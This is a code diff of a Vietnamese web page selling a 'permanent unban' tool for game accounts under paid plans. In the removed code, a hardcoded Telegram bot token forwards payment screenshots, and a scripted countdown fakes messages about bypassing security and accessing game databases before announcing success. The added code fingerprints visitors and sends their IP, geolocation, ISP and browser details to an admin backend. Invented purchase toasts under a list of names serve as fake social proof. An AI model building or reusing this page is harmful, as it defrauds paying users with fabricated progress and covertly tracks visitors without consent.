@@ -3,13 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, shrink-to-fit=no">
-  <title>Tool Mở Band Vĩnh Viễn - Đa Nền Tảng </title>
+  <title>Tool Mở Band Vĩnh Viễn - Đa Nền Tảng</title>
   <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-  
-  <link rel="manifest" href="data:application/manifest+json,{'name':'Tool Mở Band Vĩnh Viễn','short_name':'Mở Band','start_url':'/','display':'standalone','theme_color':'#0a0f1e','background_color':'#0a0f1e','icons':[{'src':'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🛡️</text></svg>','sizes':'192x192','type':'image/svg+xml'}]}">
   
   <style>
     :root {
@@ -37,7 +34,6 @@
       padding: 20px;
       position: relative;
       overflow-x: hidden;
-      transition: all 0.3s ease;
     }
 
     .particles-container {
@@ -120,7 +116,6 @@
       background: #1d2c45; border: 2px solid #2e405b; border-radius: 40px;
       padding: 10px 22px; font-weight: 600; color: #cfdefa; cursor: pointer;
       transition: 0.2s; display: flex; align-items: center; gap: 8px; font-size: 0.95rem;
-      position: relative; overflow: hidden;
     }
     .btn-option.active {
       background: #0077ff; border-color: #00e6ff; color: white;
@@ -189,15 +184,22 @@
       border-left: 4px solid #f1c40f; animation: fadeIn 0.5s ease;
     }
 
-    .fraud-indicator {
-      position: fixed; top: 20px; right: 20px; background: rgba(46, 204, 113, 0.1);
-      border: 1px solid #2ecc71; border-radius: 20px; padding: 10px 15px;
-      z-index: 1000; font-size: 0.85rem;
+    .banned-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.95);
+      z-index: 99999;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      text-align: center;
+      padding: 20px;
     }
-    .ws-status { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
-    .ws-connected { background: #2ecc71; }
-    .ws-disconnected { background: #e74c3c; }
-    .ws-connecting { background: #f39c12; animation: blink 1s infinite; }
+    .banned-overlay.show { display: flex; }
+    .banned-overlay i { font-size: 5rem; color: #ff6b6b; margin-bottom: 20px; }
+    .banned-overlay h2 { color: #ff6b6b; font-size: 2rem; margin-bottom: 10px; }
+    .banned-overlay p { color: #b0d4ff; font-size: 1.1rem; max-width: 500px; }
 
     @media (max-width: 600px) {
       .container { padding: 20px 15px; }
@@ -209,46 +211,43 @@
   </style>
 </head>
 <body>
+  <!-- Banned Overlay -->
+  <div class="banned-overlay" id="bannedOverlay">
+    <i class="fas fa-ban"></i>
+    <h2>🚫 Truy cập bị từ chối</h2>
+    <p>Địa chỉ IP của bạn đã bị chặn bởi quản trị viên.</p>
+    <p style="color:#6c7e9e; font-size:0.9rem; margin-top:10px;">IP: <strong id="bannedIpDisplay"></strong></p>
+    <p style="color:#6c7e9e; font-size:0.9rem;">Nếu bạn cho rằng đây là nhầm lẫn, vui lòng liên hệ admin.</p>
+  </div>
+
   <!-- Particles Background -->
   <div class="particles-container" id="particlesContainer"></div>
   
   <!-- Toast Notifications Container -->
   <div id="toastContainer"></div>
 
-  <!-- Fraud Risk Indicator -->
-  <div class="fraud-indicator" id="fraudIndicator">
-    <i class="fas fa-shield-alt"></i> Risk: <strong id="riskLevel">Low</strong>
-  </div>
-
   <!-- Main Content -->
-  <div class="main-wrapper">
+  <div class="main-wrapper" id="mainContent">
     <div class="container">
       <!-- Header Info -->
       <div style="text-align:right; margin-bottom:10px; display:flex; flex-wrap:wrap; justify-content:flex-end; gap:8px; align-items:center;">
-        <span style="margin-right:10px;">
-          <span class="ws-status ws-connecting" id="wsStatus"></span>
-          WS: <strong id="wsStatusText">Connecting...</strong>
-        </span>
-        <span style="background:rgba(155,89,182,0.1); border:1px solid #9b59b6; border-radius:15px; padding:5px 12px; font-size:0.75rem;">
-          <i class="fas fa-fingerprint"></i> <strong id="deviceHash">Loading...</strong>
-        </span>
         <span style="background:linear-gradient(135deg,#f39c12,#e74c3c); color:white; padding:5px 12px; border-radius:15px; font-weight:bold; font-size:0.85rem;">
           <i class="fas fa-crown"></i> Lv.<span id="userLevel">1</span>
         </span>
         <span style="background:rgba(0,200,255,0.1); border:1px solid #00c8ff; border-radius:15px; padding:5px 12px; font-size:0.75rem;">
-          <i class="fas fa-globe"></i> IP: <strong id="userIpDisplay">Loading...</strong>
+          <i class="fas fa-globe"></i> <span id="userLocation">Đang lấy vị trí...</span>
         </span>
       </div>
 
       <!-- Logo & Title -->
-      <div style="text-align:center; font-size:3.5rem; color:#00e6ff; margin-bottom:10px; animation: float 3s ease-in-out infinite;">
+      <div style="text-align:center; font-size:3.5rem; color:#00e6ff; margin-bottom:10px;">
         <i class="fas fa-shield-haltered"></i>
       </div>
       <h1 style="font-size:2.4rem; font-weight:800; background:linear-gradient(to right,#ffd966,#ffb347,#ff8c42); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; text-align:center;">
         MỞ BAND VĨNH VIỄN
       </h1>
       <div style="text-align:center; color:#b0d4ff; margin-bottom:20px;">
-        <i class="fas fa-check-circle"></i> Đa Game • Auto Telegram • AI Powered • Bảo Hành Uy Tín
+        <i class="fas fa-check-circle"></i> Đa Game • Auto Xử Lý • AI Powered • Bảo Hành Uy Tín
       </div>
 
       <!-- Online Counter -->
@@ -497,7 +496,7 @@
   </div>
 
   <!-- Chat Widget -->
-  <div style="position:fixed; bottom:20px; right:20px; z-index:1000;">
+  <div style="position:fixed; bottom:20px; right:20px; z-index:1000;" id="chatWidget">
     <div id="chatPopup" class="hidden" style="position:fixed; bottom:90px; right:20px; width:350px; max-width:90vw; background:#141b2b; border:1px solid #00e6ff; border-radius:20px; padding:15px; box-shadow:0 10px 30px rgba(0,0,0,0.5);">
       <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
         <strong><i class="fas fa-robot"></i> Live Chat Hỗ Trợ</strong>
@@ -517,21 +516,18 @@
     </button>
   </div>
 
+  <script src="sync.js"></script>
   <script>
-    // ============================================
-    // CONFIGURATION
-    // ============================================
-    const TELEGRAM_BOT_TOKEN = '8732357215:AAFmcjicU5ejU7xZ70vAmkG8Coqk-iDY3VI';
-    const TELEGRAM_CHAT_ID = '8998147404';
-    const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
-
     // ============================================
     // GLOBAL STATE
     // ============================================
     let userIP = '';
+    let userLocation = null;
     let deviceFingerprint = '';
     let uploadedImageFile = null;
     let uploadedImageData = null;
+    let syncManager = null;
+    let isBanned = false;
 
     const state = {
       game: 'freefire',
@@ -541,9 +537,7 @@
       plan: { name: 'basic', price: 150000, time: '30-45' },
       currentOrderId: null,
       captchaResult: 0,
-      pollingOffset: 0,
-      countdownInterval: null,
-      pollingInterval: null
+      countdownInterval: null
     };
 
     // ============================================
@@ -561,526 +555,209 @@
     }
 
     // ============================================
-    // DEVICE FINGERPRINT
+    // IP & LOCATION FETCHING
     // ============================================
+    async function fetchIPAndLocation() {
+      try {
+        // Lấy IP từ nhiều nguồn
+        const ipApis = [
+          'https://api.ipify.org?format=json',
+          'https://api64.ipify.org?format=json',
+          'https://api.ip.sb/jsonip',
+          'https://api.my-ip.io/ip.json',
+          'https://ipinfo.io/json'
+        ];
+        
+        for (const api of ipApis) {
+          try {
+            const response = await fetch(api, { 
+              mode: 'cors',
+              headers: { 'Accept': 'application/json' }
+            });
+            if (response.ok) {
+              const data = await response.json();
+              userIP = data.ip || data.ip_address || '';
+              if (userIP) break;
+            }
+          } catch (e) { 
+            continue; 
+          }
+        }
+        
+        if (!userIP) userIP = 'unknown';
+
+        // Lấy thông tin vị trí
+        const locationApis = [
+          {
+            url: `https://ipinfo.io/${userIP}/json`,
+            parser: (data) => ({
+              ip: data.ip || userIP,
+              city: data.city || 'Unknown',
+              region: data.region || 'Unknown',
+              country: data.country || 'Unknown',
+              isp: data.org || 'Unknown',
+              timezone: data.timezone || 'Unknown',
+              latitude: data.loc ? data.loc.split(',')[0] : 0,
+              longitude: data.loc ? data.loc.split(',')[1] : 0
+            })
+          },
+          {
+            url: `http://ip-api.com/json/${userIP}`,
+            parser: (data) => ({
+              ip: data.query || userIP,
+              city: data.city || 'Unknown',
+              region: data.regionName || 'Unknown',
+              country: data.country || 'Unknown',
+              isp: data.isp || data.org || 'Unknown',
+              timezone: data.timezone || 'Unknown',
+              latitude: data.lat || 0,
+              longitude: data.lon || 0
+            })
+          },
+          {
+            url: `https://ipapi.co/${userIP}/json/`,
+            parser: (data) => ({
+              ip: data.ip || userIP,
+              city: data.city || 'Unknown',
+              region: data.region || 'Unknown',
+              country: data.country_name || 'Unknown',
+              isp: data.org || 'Unknown',
+              timezone: data.timezone || 'Unknown',
+              latitude: data.latitude || 0,
+              longitude: data.longitude || 0
+            })
+          }
+        ];
+        
+        for (const api of locationApis) {
+          try {
+            const response = await fetch(api.url, {
+              mode: 'cors',
+              headers: { 'Accept': 'application/json' }
+            });
+            if (response.ok) {
+              const data = await response.json();
+              userLocation = api.parser(data);
+              break;
+            }
+          } catch (e) { 
+            continue; 
+          }
+        }
+        
+        if (!userLocation) {
+          userLocation = { 
+            ip: userIP, 
+            city: 'Unknown', 
+            country: 'Unknown', 
+            isp: 'Unknown',
+            region: 'Unknown'
+          };
+        }
+
+        return userLocation;
+      } catch (error) {
+        console.error('Error fetching IP/location:', error);
+        userIP = 'error';
+        userLocation = { ip: 'error', city: 'Error', country: 'Error', isp: 'Error' };
+        return userLocation;
+      }
+    }
+
     async function generateDeviceFingerprint() {
-      const components = {
-        screen: `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        language: navigator.language,
-        platform: navigator.platform,
-        cores: navigator.hardwareConcurrency || 'unknown',
-        memory: navigator.deviceMemory || 'unknown',
-        touchPoints: navigator.maxTouchPoints || 0,
-        userAgent: navigator.userAgent.substring(0, 100)
-      };
-
       try {
-        const canvas = document.createElement('canvas');
-        canvas.width = 200;
-        canvas.height = 50;
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(125, 1, 62, 20);
-        ctx.fillStyle = '#069';
-        ctx.fillText('Fingerprint!', 2, 15);
-        components.canvas = canvas.toDataURL();
-      } catch (e) {
-        components.canvas = 'error';
-      }
-
-      const str = JSON.stringify(components);
-      const encoder = new TextEncoder();
-      const data = encoder.encode(str);
-      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-      const hashArray = Array.from(new Uint8Array(hashBuffer));
-      return hashArray.map(b => b.toString(16).padStart(2, '0')).join('').substr(0, 16);
-    }
-
-    // ============================================
-    // IP FETCHING
-    // ============================================
-    async function fetchUserIP() {
-      const apis = [
-        'https://api.ipify.org?format=json',
-        'https://api64.ipify.org?format=json',
-        'https://api.ip.sb/jsonip',
-        'https://api.my-ip.io/ip.json'
-      ];
-      
-      for (const api of apis) {
-        try {
-          const response = await fetch(api);
-          if (response.ok) {
-            const data = await response.json();
-            userIP = data.ip || data.ip_address || 'unknown';
-            return userIP;
-          }
-        } catch (e) {
-          continue;
-        }
-      }
-      
-      userIP = 'unknown_' + Date.now();
-      return userIP;
-    }
-
-    async function fetchIPDetails(ip) {
-      try {
-        const response = await fetch(`https://ipapi.co/${ip}/json/`);
-        if (response.ok) return await response.json();
-      } catch (e) {}
-      
-      try {
-        const response = await fetch(`http://ip-api.com/json/${ip}`);
-        if (response.ok) {
-          const data = await response.json();
-          return {
-            ip: data.query,
-            city: data.city,
-            region: data.regionName,
-            country: data.country,
-            org: data.org,
-            isp: data.isp
-          };
-        }
-      } catch (e) {}
-      
-      return {};
-    }
-
-    // ============================================
-    // TELEGRAM API FUNCTIONS
-    // ============================================
-    async function sendToTelegram(text, parseMode = 'HTML') {
-      try {
-        const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: text,
-            parse_mode: parseMode
-          })
-        });
-        return await response.json();
-      } catch (e) {
-        console.error('Telegram send error:', e);
-        return null;
-      }
-    }
-
-    async function sendPhotoToTelegram(imageBlob, caption = '') {
-      try {
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('photo', imageBlob, 'payment.jpg');
-        if (caption) formData.append('caption', caption);
-        
-        const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        });
-        return await response.json();
-      } catch (e) {
-        console.error('Telegram photo send error:', e);
-        return null;
-      }
-    }
-
-    async function sendMessageWithButtons(text, buttons) {
-      try {
-        const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: text,
-            parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: buttons }
-          })
-        });
-        return await response.json();
-      } catch (e) {
-        console.error('Telegram buttons send error:', e);
-        return null;
-      }
-    }
-
-    // ============================================
-    // TELEGRAM POLLING FOR ADMIN RESPONSE
-    // ============================================
-    async function startPollingForApproval(sentMessageId, orderId) {
-      if (state.pollingInterval) clearInterval(state.pollingInterval);
-      
-      state.pollingInterval = setInterval(async () => {
-        try {
-          const res = await fetch(`${TELEGRAM_API}/getUpdates?offset=${state.pollingOffset}&timeout=5`);
-          const data = await res.json();
-          
-          if (!data.ok || !data.result.length) return;
-          
-          for (const update of data.result) {
-            state.pollingOffset = update.update_id + 1;
-            
-            if (update.callback_query) {
-              const cb = update.callback_query;
-              const callbackData = cb.data;
-              const msgId = cb.message?.message_id;
-              
-              if (msgId === sentMessageId) {
-                const parts = callbackData.split('_');
-                const action = parts[0];
-                
-                if (action === 'approve') {
-                  updateOrderStatus(orderId, 'approved');
-                  await sendToTelegram(`✅ <b>ĐÃ DUYỆT</b> mở band cho #${orderId}. Tool đang tự động chạy...`);
-                  playSound('success');
-                  clearInterval(state.pollingInterval);
-                } else if (action === 'reject') {
-                  await sendToTelegram(`⚠️ <b>Vui lòng nhập lý do từ chối</b> cho #${orderId} (reply tin nhắn này)`);
-                  listenForRejectReason(orderId);
-                  clearInterval(state.pollingInterval);
-                }
-                
-                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({
-                    callback_query_id: cb.id,
-                    text: action === 'approve' ? '✅ Đã duyệt!' : '❌ Đã từ chối!'
-                  })
-                });
-              }
-            }
-          }
-        } catch (e) {
-          // Silent fail, will retry
-        }
-      }, 3000);
-    }
-
-    function listenForRejectReason(orderId) {
-      const reasonInterval = setInterval(async () => {
-        try {
-          const res = await fetch(`${TELEGRAM_API}/getUpdates?offset=${state.pollingOffset}&timeout=5`);
-          const data = await res.json();
-          for (const update of data.result) {
-            state.pollingOffset = update.update_id + 1;
-            if (update.message?.reply_to_message?.text?.includes('Vui lòng nhập lý do từ chối')) {
-              updateOrderStatus(orderId, 'rejected', update.message.text);
-              clearInterval(reasonInterval);
-              playSound('error');
-            }
-          }
-        } catch (e) {}
-      }, 3000);
-    }
-
-    // ============================================
-    // ORDER STATUS UPDATES
-    // ============================================
-    function updateOrderStatus(orderId, status, reason = '') {
-      const box = document.getElementById('resultBox');
-      box.classList.remove('hidden');
-      document.getElementById('submitRequestBtn').disabled = false;
-      document.getElementById('submitRequestBtn').innerHTML = '<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND';
-
-      if (status === 'approved') {
-        box.innerHTML = `
-          <div style="color:#2ecc71;">
-            <h3>✅ #${orderId} ĐÃ ĐƯỢC DUYỆT!</h3>
-            <p>Tool đang tự động xử lý mở band cho tài khoản của bạn...</p>
-          </div>
-        `;
-        document.getElementById('progressBar').classList.remove('hidden');
-        resetProgress();
-        document.getElementById('progressDuyet').classList.add('completed');
-        document.getElementById('progressXuLy').classList.add('active');
-        showWarranty(orderId, state.plan.name);
-        
-        const processingTime = state.plan.name === 'ultimate' ? 300 + Math.random() * 300 : 
-                               state.plan.name === 'vip' ? 600 + Math.random() * 300 : 
-                               1800 + Math.random() * 900;
-        startCountdown(Math.floor(processingTime), orderId);
-        
-        // Send notification
-        if (Notification.permission === 'granted') {
-          new Notification('Tool Mở Band', {
-            body: `Yêu cầu #${orderId} đã được duyệt! Tool đang chạy...`,
-            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🛡️</text></svg>'
-          });
-        }
-      } else if (status === 'rejected') {
-        box.innerHTML = `
-          <div style="color:#ff6b6b;">
-            <h3>❌ #${orderId} BỊ TỪ CHỐI</h3>
-            <p><strong>Lý do:</strong> ${reason || 'Không xác định'}</p>
-            <p style="font-size:0.9rem; color:#9aa9c1;">Vui lòng kiểm tra lại thông tin hoặc liên hệ admin để được hỗ trợ.</p>
-          </div>
-        `;
-        document.getElementById('progressBar').classList.add('hidden');
-        document.getElementById('timerDisplay').classList.add('hidden');
-      }
-    }
-
-    function resetProgress() {
-      ['progressDuyet', 'progressXuLy', 'progressDone'].forEach(s => {
-        document.getElementById(s).classList.remove('active', 'completed');
-      });
-    }
-
-    function showWarranty(orderId, plan) {
-      const periods = { 'basic': '3 tháng', 'vip': '6 tháng', 'ultimate': '12 tháng' };
-      const period = periods[plan] || '12 tháng';
-      
-      const existing = document.getElementById('warrantySection');
-      if (existing) existing.remove();
-      
-      const warrantyDiv = document.createElement('div');
-      warrantyDiv.id = 'warrantySection';
-      warrantyDiv.style.cssText = 'background:linear-gradient(135deg,#1d2c45,#2e405b); border:2px solid #f39c12; border-radius:20px; padding:20px; text-align:center; margin-top:20px;';
-      warrantyDiv.innerHTML = `
-        <h3 style="color:#f39c12;">🛡️ Thẻ Bảo Hành Điện Tử</h3>
-        <p style="color:#b0d4ff;">Mã bảo hành của bạn:</p>
-        <div style="font-size:1.5rem; font-weight:bold; color:#ffd966; letter-spacing:2px; margin:10px 0;">BH-${orderId}</div>
-        <p style="color:#b0d4ff;">Thời hạn bảo hành: <strong style="color:#2ecc71;">${period}</strong></p>
-        <p style="font-size:0.85rem; color:#9aa9c1;">Nếu tài khoản bị band lại trong thời gian bảo hành, chúng tôi sẽ mở lại miễn phí.</p>
-      `;
-      
-      document.getElementById('resultBox').after(warrantyDiv);
-    }
-
-    function startCountdown(duration, orderId) {
-      const display = document.getElementById('timerDisplay');
-      display.classList.remove('hidden');
-      let remaining = duration;
-      
-      if (state.countdownInterval) clearInterval(state.countdownInterval);
-      
-      const messages = [
-        '🔍 Đang quét hệ thống bảo mật...',
-        '🔗 Đã kết nối đến máy chủ game...',
-        '🔓 Đang bypass lớp bảo vệ...',
-        '📡 Đã truy cập vào database...',
-        '🛠️ Đang gỡ lệnh band khỏi tài khoản...',
-        '🔄 Đang đồng bộ dữ liệu...',
-        '✅ Đã gỡ band thành công!'
-      ];
-      let msgIndex = 0;
-      
-      state.countdownInterval = setInterval(() => {
-        const min = Math.floor(remaining / 60);
-        const sec = remaining % 60;
-        display.textContent = `⏳ Đang xử lý: ${min}:${sec.toString().padStart(2, '0')}`;
-        
-        // Update progress messages
-        const progress = ((duration - remaining) / duration);
-        const newMsgIndex = Math.floor(progress * messages.length);
-        if (newMsgIndex > msgIndex && newMsgIndex < messages.length) {
-          msgIndex = newMsgIndex;
-          const msgDisplay = document.createElement('div');
-          msgDisplay.style.cssText = 'text-align:center; color:#9aa9c1; font-size:0.9rem; margin-top:5px;';
-          msgDisplay.textContent = messages[msgIndex];
-          display.after(msgDisplay);
-        }
-        
-        if (remaining <= 0) {
-          clearInterval(state.countdownInterval);
-          display.textContent = '✅ HOÀN THÀNH! Kiểm tra tài khoản ngay.';
-          document.getElementById('progressXuLy').classList.add('completed');
-          document.getElementById('progressDone').classList.add('completed');
-          document.getElementById('progressDone').classList.remove('active');
-          playSound('complete');
-          
-          // Show success notification
-          Swal.fire({
-            icon: 'success',
-            title: '🎉 Mở Band Thành Công!',
-            text: 'Tài khoản của bạn đã được mở band vĩnh viễn. Hãy kiểm tra ngay!',
-            confirmButtonText: 'OK'
-          });
-        }
-        remaining--;
-      }, 1000);
-    }
-
-    // ============================================
-    // IMAGE UPLOAD HANDLING
-    // ============================================
-    function setupImageUpload() {
-      const dropZone = document.getElementById('fileUploadArea');
-      const fileInput = document.getElementById('paymentImage');
-      
-      if (!dropZone || !fileInput) return;
-
-      dropZone.addEventListener('click', (e) => {
-        if (e.target.closest('#imagePreviewContainer') || e.target.closest('button')) return;
-        fileInput.click();
-      });
-
-      fileInput.addEventListener('change', (e) => {
-        const file = e.target.files[0];
-        if (file) handleImageFile(file);
-      });
-
-      // Drag and drop
-      dropZone.addEventListener('dragover', (e) => {
-        e.preventDefault();
-        e.stopPropagation();
-        dropZone.classList.add('drag-over');
-      });
-
-      dropZone.addEventListener('dragleave', (e) => {
-        e.preventDefault();
-        e.stopPropagation();
-        dropZone.classList.remove('drag-over');
-      });
-
-      dropZone.addEventListener('drop', (e) => {
-        e.preventDefault();
-        e.stopPropagation();
-        dropZone.classList.remove('drag-over');
-        const file = e.dataTransfer.files[0];
-        if (file && file.type.startsWith('image/')) {
-          handleImageFile(file);
-        } else {
-          Swal.fire('❌', 'Vui lòng chọn file ảnh (JPG, PNG, GIF, WEBP)!', 'error');
-        }
-      });
-
-      // Paste from clipboard
-      document.addEventListener('paste', (e) => {
-        const items = e.clipboardData.items;
-        for (const item of items) {
-          if (item.type.startsWith('image/')) {
-            handleImageFile(item.getAsFile());
-            break;
-          }
-        }
-      });
-    }
-
-    function handleImageFile(file) {
-      const validTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
-      if (!validTypes.includes(file.type)) {
-        Swal.fire('❌', 'Định dạng không hỗ trợ! Vui lòng chọn JPG, PNG, GIF hoặc WEBP.', 'error');
-        return;
-      }
-      
-      if (file.size > 10 * 1024 * 1024) {
-        Swal.fire('❌', 'File quá lớn! Vui lòng chọn ảnh dưới 10MB.', 'error');
-        return;
-      }
-
-      uploadedImageFile = file;
-      
-      // Show progress
-      const progressDiv = document.getElementById('uploadProgress');
-      const progressBar = document.getElementById('uploadProgressBar');
-      const percentText = document.getElementById('uploadPercent');
-      progressDiv.classList.remove('hidden');
-      
-      let progress = 0;
-      const interval = setInterval(() => {
-        progress += Math.random() * 30;
-        if (progress >= 100) {
-          progress = 100;
-          clearInterval(interval);
-          setTimeout(() => {
-            progressDiv.classList.add('hidden');
-            displayImagePreview(file);
-          }, 300);
-        }
-        progressBar.style.width = progress + '%';
-        percentText.textContent = Math.round(progress) + '%';
-      }, 200);
-    }
-
-    function displayImagePreview(file) {
-      const reader = new FileReader();
-      reader.onload = (e) => {
-        uploadedImageData = e.target.result;
-        document.getElementById('imagePreview').src = e.target.result;
-        document.getElementById('uploadPlaceholder').style.display = 'none';
-        document.getElementById('imagePreviewContainer').style.display = 'block';
-        document.getElementById('fileUploadArea').style.borderStyle = 'solid';
-        document.getElementById('fileUploadArea').style.borderColor = '#2ecc71';
-        
-        Swal.fire({
-          icon: 'success',
-          title: '✅ Tải ảnh thành công!',
-          text: `Kích thước: ${formatFileSize(file.size)}`,
-          timer: 2000,
-          showConfirmButton: false
-        });
-        playSound('notification');
-      };
-      reader.readAsDataURL(file);
-    }
-
-    function removeImage() {
-      uploadedImageFile = null;
-      uploadedImageData = null;
-      document.getElementById('paymentImage').value = '';
-      document.getElementById('imagePreview').src = '';
-      document.getElementById('uploadPlaceholder').style.display = 'block';
-      document.getElementById('imagePreviewContainer').style.display = 'none';
-      document.getElementById('fileUploadArea').style.borderStyle = 'dashed';
-      document.getElementById('fileUploadArea').style.borderColor = '#3f5580';
-    }
-
-    function zoomImage() {
-      const imgSrc = document.getElementById('imagePreview').src;
-      if (imgSrc) {
-        Swal.fire({
-          imageUrl: imgSrc,
-          imageAlt: 'Ảnh chuyển khoản',
-          showCloseButton: true,
-          showConfirmButton: false,
-          width: '90%',
-          background: '#0a0f1e'
-        });
-      }
-    }
-
-    function formatFileSize(bytes) {
-      if (bytes < 1024) return bytes + ' B';
-      if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
-      return (bytes / 1048576).toFixed(1) + ' MB';
-    }
-
-    // ============================================
-    // IMAGE COMPRESSION
-    // ============================================
-    function compressImageBlob(file, maxWidth = 800, quality = 0.7) {
-      return new Promise((resolve) => {
-        const reader = new FileReader();
-        reader.onload = (e) => {
-          const img = new Image();
-          img.onload = () => {
-            const canvas = document.createElement('canvas');
-            let width = img.width;
-            let height = img.height;
-            if (width > maxWidth) {
-              height *= maxWidth / width;
-              width = maxWidth;
-            }
-            canvas.width = width;
-            canvas.height = height;
-            canvas.getContext('2d').drawImage(img, 0, 0, width, height);
-            canvas.toBlob((blob) => resolve(blob), 'image/jpeg', quality);
-          };
-          img.src = e.target.result;
+        const components = {
+          screen: `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          language: navigator.language,
+          platform: navigator.platform,
+          cores: navigator.hardwareConcurrency || 'unknown',
+          memory: navigator.deviceMemory || 'unknown',
+          userAgent: navigator.userAgent.substring(0, 100)
         };
-        reader.readAsDataURL(file);
-      });
+
+        try {
+          const canvas = document.createElement('canvas');
+          canvas.width = 200;
+          canvas.height = 50;
+          const ctx = canvas.getContext('2d');
+          ctx.textBaseline = 'top';
+          ctx.font = '14px Arial';
+          ctx.fillStyle = '#f60';
+          ctx.fillRect(125, 1, 62, 20);
+          ctx.fillStyle = '#069';
+          ctx.fillText('Fingerprint!', 2, 15);
+          components.canvas = canvas.toDataURL();
+        } catch (e) {
+          components.canvas = 'error';
+        }
+
+        const str = JSON.stringify(components);
+        const encoder = new TextEncoder();
+        const data = encoder.encode(str);
+        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('').substr(0, 16);
+      } catch(e) {
+        return 'fp_' + Date.now().toString(36);
+      }
     }
 
     // ============================================
-    // UI EFFECTS
+    // CHECK BANNED STATUS
+    // ============================================
+    async function checkBannedStatus() {
+      if (!syncManager) return false;
+      
+      try {
+        const banned = await syncManager.isIPBanned(userIP);
+        if (banned) {
+          showBannedScreen();
+          return true;
+        }
+        return false;
+      } catch(e) {
+        return false;
+      }
+    }
+
+    function showBannedScreen() {
+      isBanned = true;
+      document.getElementById('bannedIpDisplay').textContent = userIP;
+      document.getElementById('bannedOverlay').classList.add('show');
+      document.getElementById('mainContent').style.display = 'none';
+      document.getElementById('chatWidget').style.display = 'none';
+      
+      if (syncManager) {
+        syncManager.addLog('BANNED_ACCESS', `Banned user attempted access: ${userIP}`);
+      }
+    }
+
+    // ============================================
+    // SYNC WITH ADMIN
+    // ============================================
+    async function syncVisitorInfo() {
+      if (!syncManager || isBanned) return;
+      
+      try {
+        await syncManager.addVisitor({
+          ip: userIP,
+          location: userLocation,
+          fingerprint: deviceFingerprint,
+          userAgent: navigator.userAgent.substring(0, 200),
+          screenResolution: `${window.screen.width}x${window.screen.height}`,
+          referrer: document.referrer || 'Direct',
+          timestamp: new Date().toISOString()
+        });
+        
+        await syncManager.addLog('VISITOR', `New visitor: ${userIP} - ${userLocation.city}, ${userLocation.country}`);
+      } catch(e) {
+        console.error('Error syncing visitor:', e);
+      }
+    }
+
+    // ============================================
+    // UI FUNCTIONS
     // ============================================
     function createParticles() {
       const container = document.getElementById('particlesContainer');
@@ -1096,28 +773,21 @@
       }
     }
 
-    // ============================================
-    // SOCIAL PROOF TOASTS (TÊN THẬT VIỆT NAM)
-    // ============================================
     function startSocialProof() {
-      const realNames = [
+      const names = [
         'Nguyễn Văn Hùng', 'Trần Thị Mai', 'Lê Hoàng Nam', 'Phạm Minh Tuấn',
         'Hoàng Thị Lan', 'Đặng Quốc Bảo', 'Bùi Thanh Hà', 'Ngô Hữu Phúc',
-        'Đỗ Thị Hương', 'Vũ Đình Quân', 'Trịnh Ngọc Ánh', 'Phan Văn Khánh',
-        'Dương Thị Thảo', 'Lý Văn Thành', 'Mai Xuân Trường', 'Đinh Thị Hồng',
-        'Trương Công Sơn', 'Lâm Thị Mỹ', 'Tô Văn Đức', 'Hà Thị Ngọc',
-        'Chu Văn Long', 'Tạ Thị Dung', 'Phùng Đức Thắng', 'Đoàn Thị Yến',
-        'Cao Văn Phong', 'Nghiêm Thị Hiền', 'Tống Văn Kiên', 'Hồ Thị Nhung'
+        'Đỗ Thị Hương', 'Vũ Đình Quân', 'Trịnh Ngọc Ánh', 'Phan Văn Khánh'
       ];
-      
       const plans = ['gói Cơ Bản', 'gói VIP', 'gói Ultimate'];
-      const games = ['Free Fire', 'PUBG Mobile', 'Liên Quân', 'Mobile Legends', 'Valorant'];
